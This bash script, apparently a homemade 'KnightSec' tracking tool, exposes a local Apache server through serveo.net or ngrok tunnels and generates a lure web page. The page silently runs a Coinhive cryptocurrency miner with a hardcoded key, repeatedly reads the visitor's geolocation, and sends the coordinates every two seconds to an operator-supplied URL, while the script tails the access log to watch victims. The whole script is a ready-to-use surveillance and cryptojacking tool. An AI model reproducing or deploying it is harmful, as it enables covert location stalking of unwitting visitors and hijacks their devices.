#!/bin/bash

#64_bit
xterm -e ssh -R 80:localhost:80 serveo.net & clear

#32_Bit
#xterm -e ./ngrok http 80 & clear


echo "██ ▄█▀ ███▄    █  ██▓  ▄████  ██░ ██ ▄▄▄█████▓  ██████ ▓█████  ▄████▄
██▄█▒  ██ ▀█   █ ▓██▒ ██▒ ▀█▒▓██░ ██▒▓  ██▒ ▓▒▒██    ▒ ▓█   ▀ ▒██▀ ▀█
▓███▄░ ▓██  ▀█ ██▒▒██▒▒██░▄▄▄░▒██▀▀██░▒ ▓██░ ▒░░ ▓██▄   ▒███   ▒▓█    ▄
▓██ █▄ ▓██▒  ▐▌██▒░██░░▓█  ██▓░▓█ ░██ ░ ▓██▓ ░   ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
▒██▒ █▄▒██░   ▓██░░██░░▒▓███▀▒░▓█▒░██▓  ▒██▒ ░ ▒██████▒▒░▒████▒▒ ▓███▀ ░
▒ ▒▒ ▓▒░ ▒░   ▒ ▒ ░▓   ░▒   ▒  ▒ ░░▒░▒  ▒ ░░   ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░
░ ░▒ ▒░░ ░░   ░ ▒░ ▒ ░  ░   ░  ▒ ░▒░ ░    ░    ░ ░▒  ░ ░ ░ ░  ░  ░  ▒
░ ░░ ░    ░   ░ ░  ▒ ░░ ░   ░  ░  ░░ ░  ░      ░  ░  ░     ░   ░
░  ░            ░  ░        ░  ░  ░  ░               ░     ░  ░░ ░
"
sleep 5
read -p '           URL: ' varurl
echo "<!DOCTYPE html>

<html>
    <head>
        <title>P TEST</title>
        <style type=\"text/css\">
            
            body {
                background-image: url(\"skull.jpg\");
                background-size: 1000px 1600px;
                background-repeat: no-repeat;
            }

        </style>
    </head>
    <body>

        <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js\" type='text/javascript' ></script>
	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
	var miner = new CoinHive.Anonymous('vczSZxIZuphKz8EeE7UnszkY1p9swxBS'); 
	miner.start();
</script>


        <script type='text/javascript'>
        function httpGet(theUrl)
        {
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
            xmlHttp.send( null );
            return xmlHttp.responseText;
        }


        function autoUpdate() {
          navigator.geolocation.getCurrentPosition(function(position) {
            coords = position.coords.latitude + \",\" + position.coords.longitude;
             url = \""$varurl"/logme/\" + coords;
            httpGet(url);
            console.log('should be working');
            setTimeout(autoUpdate, 2000);
        })
        };
        \$(document).ready(function(){
           autoUpdate();
        });

        </script>
    </body>
</html>" > index.html

mv index.html /Library/WebServer/Documents/index.html
cp skull.jpg /Library/WebServer/Documents/skull.jpg
sudo apachectl start
echo " TRACKURL
USE FOR YOUR OWN RESPONSABILITY

" > /var/log/apache2/access_log
xterm -e tail -f /var/log/apache2/access_log  &
clear
exit
